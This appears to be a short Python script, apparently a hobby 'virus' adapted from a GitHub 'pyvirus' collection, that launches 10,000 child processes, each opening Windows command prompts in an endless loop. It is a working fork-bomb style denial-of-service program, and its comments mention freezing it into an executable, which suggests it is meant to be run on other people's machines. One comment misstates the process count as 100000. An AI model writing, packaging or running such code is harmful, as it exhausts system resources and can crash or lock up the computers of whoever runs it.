#https://github.com/palahsu/pyvirus/blob/main/Python%20Virus%20List/pyvirus%203.py
#this github is where I found the code for opening the command prompt in a while loop
#https://superfastpython.com/multiprocessing-in-python/
#this website is where I learned about multiprocessing in python

from multiprocessing import Process                         #import Process from multiprocessing library
from multiprocessing import freeze_support                  #import freeze_support from multiprocessing library
import os                                                   #import operating system library


def cmd():                                                  #method for infinitely opening command prompts for the given operating system
    while True:
        a = os.system('start cmd')


processes = []                                              #array to store each child process created
if __name__ == '__main__':
    freeze_support()                                        #allows multiprocessing once the python file is freezed in the executable
    for i in range(10000):                                  #for loop to create 100000 child processes
        first = Process(target=cmd)                         #create child process where we call the cmd method
        first.start()                                       #start the child process
        processes.append(first)                             #append the child process to the list

    for process in processes:                               #loops the array and joins each child process so that they don't block eachother
        process.join()
